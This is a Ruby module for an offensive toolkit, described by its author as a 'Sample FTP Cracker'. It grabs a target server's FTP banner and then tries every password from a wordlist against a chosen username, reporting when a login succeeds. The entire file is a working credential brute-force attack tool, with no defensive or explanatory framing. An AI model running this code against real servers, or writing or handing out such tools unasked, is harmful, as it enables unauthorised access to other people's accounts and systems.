class CentauriusModule
  require 'net/ftp'
  require 'socket'
  require_relative '../../Utilities/Design'

  attr_accessor :infos, :param


  def initialize
    @infos = {:Author => 'MuhamRB', :Description => 'Bruteforcer ftp avec wordlist', :Title => 'Sample FTP Cracker'}
    @param = {'rhost' => nil, 'ruser' => nil, 'wordlist' => nil}
  end

  def versionFTP
    s = TCPSocket.new(@param['rhost'], 21)
    return s.recv(1024)
  end

  def checkFileExist
		if File.file?(@param['wordlist'])
			return true
		else
			return false
		end

	end

  def loginFTP(rhost, ruser, password)

    begin
      ftp = Net::FTP.new(rhost)
      ftp.login(ruser, password)
    rescue Net::FTPPermError
      puts "Incorrect -> #{password}".red
    rescue EOFError
      puts "Incorrect -> #{password}".red
    else
      abort("FTP cracked with success password => #{password}".magenta)
      ftp.close()
    end
  end

  def Main()
    puts "\033[1;91m[\033[1;94m*\033[1;91m]\033[00m Connecting #{@param['rhost']}..."
		puts "\033[1;91m[\033[1;94m*\033[1;91m]\033[00m Version SSH: #{versionFTP()}"
    if checkFileExist()
      line = File.readlines(@param['wordlist'])
      i = 0
      while i < line.size
        thr = Thread.new { loginFTP(@param['rhost'], @param['ruser'], line[i].chomp) }
        thr.join
        i += 1
      end
    else
      puts "#{@param['wordlist']} not found".red
    end
  end

end
